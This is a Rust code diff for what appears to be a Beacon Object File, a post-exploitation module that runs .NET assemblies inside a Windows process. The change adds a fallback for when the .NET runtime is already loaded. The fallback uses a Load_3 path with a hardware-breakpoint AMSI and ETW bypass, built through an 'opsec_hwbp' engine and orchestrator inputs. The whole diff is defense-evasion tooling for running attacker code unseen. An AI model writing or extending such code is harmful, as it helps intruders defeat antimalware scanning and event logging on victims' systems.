@@ -42,6 +42,7 @@ fn main(args: *mut u8, len: usize) {
 
 #[cfg(target_os = "windows")]
 fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
+    use clr_orchestrator::OrchestratorError;
     use error::BofError;
 
     #[cfg(feature = "diag-log")]
@@ -71,7 +72,7 @@ fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
 
         #[cfg(feature = "diag-log")]
         debug_log::log(b"[bof] step 2: building StompInput");
-        let input = clr_orchestrator::StompInput {
+        let stomp_input = clr_orchestrator::StompInput {
             app_domain:  &a.app_domain,
             pipe_name:   &a.pipe_name,
             asm_args:    &a.asm_args,
@@ -85,13 +86,53 @@ fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
 
         #[cfg(feature = "diag-log")]
         debug_log::log(b"[bof] step 3: orchestrate_stomp()");
-        let r = clr_orchestrator::orchestrate_stomp(&input);
-        #[cfg(feature = "diag-log")]
-        match &r {
-            Ok(())  => debug_log::log(b"[bof]   orchestrate_stomp returned Ok"),
-            Err(_) => debug_log::log(b"[bof]   orchestrate_stomp returned Err"),
+        let r = clr_orchestrator::orchestrate_stomp(&stomp_input);
+
+        match r {
+            Ok(()) => {
+                #[cfg(feature = "diag-log")]
+                debug_log::log(b"[bof]   orchestrate_stomp returned Ok");
+            }
+            Err(OrchestratorError::ClrAlreadyRunning) => {
+                // CLR was started by an earlier inline run or another tool
+                // before this BOF could register IHostMemoryManager.  Fall
+                // back to the Load_3 path with HWBP-based AMSI/ETW bypass
+                // (same behaviour as v0.4).
+                #[cfg(feature = "diag-log")]
+                debug_log::log(b"[bof]   stomp unavailable: falling back to Load_3 + HWBP");
+                rustbof::eprintln!(
+                    "[!] CLR already running in this process — stomp unavailable, falling back to Load_3 + HWBP"
+                );
+
+                let engine = opsec_hwbp::HwbpEngine::init()
+                    .map_err(|e| BofError::Orchestrator(OrchestratorError::Hwbp(e)))?;
+
+                let orch_input = clr_orchestrator::OrchestrateInput {
+                    app_domain:  &a.app_domain,
+                    amsi:        a.amsi,
+                    etw:         a.etw,
+                    mailslot:    a.mailslot,
+                    entry_point: a.entry_point,
+                    slot_name:   &a.slot_name,
+                    pipe_name:   &a.pipe_name,
+                    asm_args:    &a.asm_args,
+                    mode:        a.mode,
+                    main_name:   &a.main_name,
+                    asm_bytes:   &a.asm_bytes,
+                    #[cfg(feature = "diag-log")]
+                    log_fn: Some(diag_thunk),
+                    #[cfg(not(feature = "diag-log"))]
+                    log_fn: None,
+                };
+
+                clr_orchestrator::orchestrate(&orch_input, &engine)?;
+            }
+            Err(e) => {
+                #[cfg(feature = "diag-log")]
+                debug_log::log(b"[bof]   orchestrate_stomp returned Err");
+                return Err(BofError::Orchestrator(e));
+            }
         }
-        r?;
     }
     Ok(())
 }
